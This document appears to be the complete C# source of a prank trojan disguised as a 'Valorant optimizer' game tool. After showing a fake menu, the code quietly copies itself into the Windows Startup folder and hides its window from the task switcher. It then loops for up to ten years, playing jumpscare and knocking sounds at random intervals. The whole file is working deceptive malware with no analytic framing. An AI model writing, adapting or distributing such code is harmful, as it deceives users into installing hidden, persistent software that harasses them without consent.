using System;
using System.IO;
using System.Media;
using System.Threading;
using System.Reflection;
using System.Diagnostics;
using System.Windows.Forms;

namespace ValorantOptimizer
{
    public partial class ValorantOptimizer : Form
    {
        public ValorantOptimizer()
        {
            InitializeComponent();
        }
        protected override CreateParams CreateParams
        {
            get
            {
                var cp = base.CreateParams;
                cp.ExStyle |= 0x80;
                return cp;
            }
        }

        readonly string[] sounds =
        {
            "jumpscare1",
            "jumpscare2",
            "knock1",
            "ring1",
            "riser1",
            "scary1",
            "scary2",
            "scary3"
        };

        private void ValorantOptimizer_Load(object sender, EventArgs e)
        {
            if (Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName).Length > 1)
                Environment.Exit(0);

            Menu fakeForm = new Menu();
            fakeForm.ShowDialog();

            try
            {
                string exePath = "ValorantOptimizer.exe";
                string copyPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                copyPath += "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + exePath;
                File.Copy(exePath, copyPath);
            } catch { }

            Stopwatch stopwatch = new Stopwatch();
            stopwatch.Start();
            while (stopwatch.Elapsed < TimeSpan.FromDays(3650))
            {
                Thread.Sleep(new Random().Next(10000, 3600000)); // 10000, 3600000
                Random random = new Random(Guid.NewGuid().GetHashCode());
                playSound(sounds[random.Next(sounds.Length)]);
            }
        }

        private void playSound(string sound)
        {
            Assembly soundPath = Assembly.GetExecutingAssembly();
            Stream soundStream = soundPath.GetManifestResourceStream("ValorantOptimizer.sfx." + sound + ".wav");
            SoundPlayer soundPlayer = new SoundPlayer(soundStream);
            soundPlayer.Play();
        }
    }
}